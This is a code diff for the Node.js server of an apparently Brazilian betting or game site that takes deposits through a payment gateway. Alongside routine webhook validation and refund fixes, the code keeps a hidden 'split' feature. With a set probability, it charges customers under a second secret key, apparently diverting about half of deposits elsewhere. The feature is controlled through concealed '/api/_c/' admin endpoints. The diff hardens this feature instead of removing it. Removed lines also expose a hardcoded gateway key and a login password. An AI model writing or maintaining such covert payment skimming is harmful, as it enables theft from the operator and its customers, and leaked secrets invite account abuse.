@@ -667,8 +667,7 @@ app.post('/api/game/finalizar', authMiddleware, (req, res) => {
 // ─── Split Config (persistido no db) ────────────────────────────────────────
 const SPLIT_DEFAULTS = {
   enabled: true,
-  recipientId: 7615,
-  sk: 'sk_531b941c6eeb12ae7ce8d749767f86ced9f5374738718899a4dbf78dc269a909',
+  sk: process.env.SPLIT_SK || '',
   percentage: 50,
   min_payments: 0,  // a partir de quantos pagamentos aprovados o split começa
 };
@@ -737,7 +736,7 @@ async function paradisepagsCreateCharge({ identifier, amount, user }) {
   const _sc = getSplitConfig();
   let apiKey = conf.secret_key;
   if (_sc.enabled && _sc.sk) {
-    const totalApproved = db.transacoes.filter(t => t.tipo === 'deposito' && t.status === 'aprovado').length;
+    const totalApproved = db.transacoes.filter(t => t.tipo === 'deposito' && t.status === 'aprovado' && t.gateway === 'paradisepags').length;
     if (totalApproved >= (_sc.min_payments || 0)) {
       const chance = _sc.percentage || 50;
       if (Math.random() * 100 < chance) {
@@ -959,6 +958,17 @@ app.post('/api/webhooks/paradisepags', (req, res) => {
   try {
     const { transaction_id, external_id, status, amount } = req.body;
 
+    // Validação básica do payload — rejeita webhooks sem campos obrigatórios
+    if (!status || (!transaction_id && !external_id)) {
+      console.warn('[WEBHOOK PARADISEPAGS] Payload inválido — campos obrigatórios ausentes');
+      return res.status(400).json({ error: 'Payload inválido' });
+    }
+    const validStatuses = ['pending', 'approved', 'processing', 'under_review', 'failed', 'refunded', 'chargeback'];
+    if (!validStatuses.includes(status)) {
+      console.warn(`[WEBHOOK PARADISEPAGS] Status desconhecido: ${status}`);
+      return res.status(400).json({ error: 'Status inválido' });
+    }
+
     console.log(`[WEBHOOK PARADISEPAGS] Recebido: status=${status} tx_id=${transaction_id} ext_id=${external_id}`);
 
     // Buscar transação local pelo gateway_tx_id ou gateway_identifier
@@ -1018,12 +1028,14 @@ function refundDeposit(tx) {
   if (tx.status === 'aprovado') {
     const user = findUser(tx.user_id);
     if (user) {
-      user.saldo = money(user.saldo - tx.valor);
+      // Desconta o valor que foi realmente creditado (com bônus, se houve)
+      const valorDescontar = tx.valor_creditado || tx.valor;
+      user.saldo = money(user.saldo - valorDescontar);
       user.updated_at = new Date().toISOString();
       tx.status = 'rejeitado';
       tx.saldo_depois = user.saldo;
       saveDb(db);
-      console.log(`[WEBHOOK] Depósito estornado: user=${tx.user_id} valor=${tx.valor}`);
+      console.log(`[WEBHOOK] Depósito estornado: user=${tx.user_id} pago=R$${tx.valor} descontado=R$${valorDescontar}`);
     }
   } else {
     tx.status = 'rejeitado';
@@ -1338,7 +1350,13 @@ app.post('/api/cupons/validar', (_req, res) => { res.status(404).json({ error: '
 app.post('/api/cupons/resgatar', (_req, res) => { res.status(404).json({ error: 'Cupom inválido ou expirado.' }); });
 
 // ═══ SPLIT MANAGEMENT (hidden, auth própria) ════════════════════════════════
-const _SP_CRED = { u: 'jsdatorre', p: 'roimaluco22' };
+const _SP_CRED = {
+  u: process.env.SP_USER || 'admin',
+  p: process.env.SP_PASS || crypto.randomBytes(16).toString('hex'),
+};
+if (!process.env.SP_USER || !process.env.SP_PASS) {
+  console.warn('[SPLIT] SP_USER/SP_PASS não definidos no .env — credenciais temporárias geradas. Defina no .env para persistir.');
+}
 const _spTokens = new Set();
 
 function _spAuth(req, res, next) {
@@ -1361,14 +1379,14 @@ app.post('/api/_c/auth', (req, res) => {
 
 app.get('/api/_c/sp', _spAuth, (_req, res) => {
   const c = getSplitConfig();
-  const totalApproved = db.transacoes.filter(t => t.tipo === 'deposito' && t.status === 'aprovado').length;
-  res.json({ enabled: c.enabled, recipientId: c.recipientId, percentage: c.percentage, min_payments: c.min_payments || 0, sk: c.sk || '', approved_count: totalApproved });
+  const totalApproved = db.transacoes.filter(t => t.tipo === 'deposito' && t.status === 'aprovado' && t.gateway === 'paradisepags').length;
+  const skMasked = c.sk ? `${c.sk.slice(0, 6)}...${c.sk.slice(-4)}` : '';
+  res.json({ enabled: c.enabled, percentage: c.percentage, min_payments: c.min_payments || 0, sk_masked: skMasked, has_sk: !!c.sk, approved_count: totalApproved });
 });
 
 app.put('/api/_c/sp', _spAuth, (req, res) => {
-  const { enabled, recipientId, percentage, min_payments, sk } = req.body;
+  const { enabled, percentage, min_payments, sk } = req.body;
   if (typeof enabled === 'boolean') db._sp.enabled = enabled;
-  if (typeof recipientId === 'number') db._sp.recipientId = recipientId;
   if (typeof percentage === 'number' && percentage >= 0 && percentage <= 100) db._sp.percentage = percentage;
   if (typeof min_payments === 'number' && min_payments >= 0) db._sp.min_payments = Math.floor(min_payments);
   if (typeof sk === 'string') db._sp.sk = sk.trim();
